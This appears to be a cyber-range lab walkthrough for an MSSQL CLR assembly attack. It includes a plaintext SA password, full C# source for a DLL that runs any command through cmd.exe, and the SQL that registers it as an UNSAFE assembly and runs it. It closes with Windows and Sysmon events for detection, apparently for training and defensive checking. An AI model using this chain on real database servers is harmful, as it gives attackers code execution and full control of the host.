# WT#042 — MSSQL CLR Assembly

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.23 (mbr02) |
| **Domain** | range.local |
| **Starting Credential** | SA: s@_P@ssw0rd!L@b! |
| **Tools Required** | impacket-mssqlclient, C# compiler (csc), Metasploit (optional) |
| **Certifications** | CAPE |
| **MITRE ATT&CK** | T1059.009, T1501 |
| **Difficulty** | Hard |

## Prerequisites
- CLR enabled on mbr02 MSSQL instance
- TRUSTWORTHY ON on the target database
- SA login access

## Attack Steps

### 1. Connect to mbr02 MSSQL
```powershell
impacket-mssqlclient range.local/sa:'s@_P@ssw0rd!L@b!'@192.168.77.23 -windows-auth
```

### 2. Verify CLR and TRUSTWORTHY configuration
```sql
SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled';
SELECT name, is_trustworthy_on FROM sys.databases WHERE name = 'master';
```

### 3. Create malicious C# DLL (PowerShell runner)
Compile on Kali:
```csharp
using System;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Text;

public class Stub
{
    public static SqlString Exec(SqlString command)
    {
        var proc = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + command.Value,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            }
        };
        proc.Start();
        string output = proc.StandardOutput.ReadToEnd();
        proc.WaitForExit();
        return new SqlString(output);
    }
}
```

```powershell
csc /target:library /out:cmd.dll cmd.cs
```

### 4. Register and execute CLR assembly
```sql
-- Enable CLR (if not already)
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Mark master as trustworthy
ALTER DATABASE master SET TRUSTWORTHY ON;

-- Create assembly from DLL
CREATE ASSEMBLY cmd_exec FROM 0x<DLL_HEX> WITH PERMISSION_SET = UNSAFE;

-- Create procedure
CREATE PROCEDURE dbo.ExecCmd
@cmd NVARCHAR(MAX)
AS EXTERNAL NAME cmd_exec.[Stub].Exec;

-- Execute
EXEC dbo.ExecCmd 'whoami';
```

## Post-Exploitation Chain
CLR assembly execution → Code execution in MSSQL process context → Full host compromise (mbr02)

## Telemetry Verification
- **Event 4688**: csc.exe compilation activity
- **Event 1102 (SQL)**: CREATE ASSEMBLY audit
- **Sysmon Event 7**: DLL image load of custom assembly
- **Sysmon Event 1**: sqlservr.exe spawning child processes via CLR

## Status
CONFIGURED
